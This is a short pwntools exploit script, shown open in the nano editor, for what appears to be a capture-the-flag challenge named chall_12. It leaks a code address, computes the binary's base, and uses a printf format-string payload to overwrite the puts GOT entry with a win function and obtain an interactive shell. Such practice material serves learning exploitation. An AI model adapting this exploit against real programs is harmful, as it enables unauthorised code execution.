  GNU nano 7.2                                                                                                                   exploit_chall_12.py
from pwn import *
import re
'''
Chall_12

printf vuln
this time, leaked address

'''

elf = ELF('./chall_12')
p = process('./chall_12')

resp = p.recv()
re.findall(b"(0x[0-9a-f]{6,16})", resp)
main = int(re.findall(b"(0x[0-9a-f]{6,16})", resp)[0], 16)
elf.address = main - elf.sym.main
print(hex(elf.address))

offset = 6
target = elf.got.puts     #Overwirte this
payload = elf.sym.win     #with this instead, come to the dark side, we have shells
bomb = fmtstr_payload(offset,{target:payload})
print('The Bomb: ', bomb)

p.sendline(bomb) #Bombs away


p.interactive()
